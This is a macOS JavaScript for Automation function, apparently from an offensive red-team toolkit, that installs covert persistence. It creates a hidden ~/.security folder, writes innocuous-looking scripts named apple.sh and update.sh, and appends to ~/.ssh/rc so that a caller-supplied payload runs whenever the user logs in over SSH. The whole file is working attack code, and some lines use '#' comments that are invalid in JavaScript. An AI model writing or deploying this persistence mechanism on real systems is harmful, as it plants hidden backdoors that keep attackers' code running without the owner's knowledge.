function SSHrc(persist, hiddenFiles) {

    ObjC.import('Foundation')
    ObjC.import("Cocoa");
    ObjC.import('stdlib')
    var app = Application.currentApplication();
    app.includeStandardAdditions = true;

    var userHome = $.getenv('HOME')
    var sysVers = app.systemInfo().systemVersion
    var output = ""
    try {
        function writeTextToFile(text, file, overwriteExistingContent) {
            var fileString = file.toString()
            var openedFile = app.openForAccess(Path(fileString), {
                writePermission: true
            })
            if (overwriteExistingContent) {
                app.setEof(openedFile, {
                    to: 0
                })
            }
            app.write(text, {
                to: openedFile,
                startingAt: app.getEof(openedFile)
            })
            app.closeAccess(openedFile)
        }

        function chmod(value, path) {
            let a = $({
                NSFilePosixPermissions: value
            })
            let p = $(path).stringByStandardizingPath
            let e = $()
            let r = $.NSFileManager.defaultManager
                .setAttributesOfItemAtPathError(a, p, e)
            return r
        }

        //PLACEHOLDER: change based on which process you want to monitor for (e.g. osascript)
        var payload =
            `RUNNING=$(ps ax | grep osascript | wc -l);
if [ "$RUNNING" -lt 2 ]
then
  cd ` + userHome + `/.security
  ./update.sh &
else
  exit
fi`

        var profile = userHome + `/.security/apple.sh`

        function createFolder(path) {
            $.NSFileManager.defaultManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(path, false, $(), $())
        }

        var hiddenPath = `` + userHome + `/.security`
        isDir = Ref()
        var hiddenDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(hiddenPath, isDir)

        if (hiddenFiles == "yes") {


            if (hiddenDirectoryExistsCheck == false) {
                createFolder(hiddenPath)
            }

            var payloadPath = userHome + '/.security/apple.sh'
            writeTextToFile(payload, payloadPath, true)

            var persistPath = userHome + '/.security/update.sh'
            writeTextToFile(persist, persistPath, true)

            chmod(0o755, payloadPath)
            chmod(0o755, persistPath)

                profilePath = userHome + '/.ssh/rc'
                writeTextToFile(profile, profilePath, false)
                output += "Persistence installed at " + userHome + '/.ssh/rc' + " , " + userHome + '/.security/apple.sh' + ",and " + userHome + '/.security/apple.sh'

        } else {

           # var payload =
           #     `RUNNING=$(ps ax | grep osascript | wc -l);
#if [ "$RUNNING" -lt 2 ]
#then
#	setopt LOCAL_OPTIONS NO_MONITOR; nohup payload > /dev/null 2>&1&
#else
 # setopt LOCAL_OPTIONS NO_MONITOR; exit > /dev/null 2>&1&
#fi`

                profilePath = userHome + '/.ssh/rc'

                var payload = 
                `RUNNING=$(ps ax | grep osascript | wc -l);
if [ "$RUNNING" -lt 2 ]
then
    nohup payload > /dev/null 2>&1&
else
   exit > /dev/null 2>&1&
fi`

                var updatedPayload = payload.replace(/payload/g, persist)

                writeTextToFile(updatedPayload, profilePath, false)
                output += "Persistence installed at " + userHome + '/.ssh/rc'
            }
        }
    } catch (error) {
        output += error.toString()
    }
    return output
}
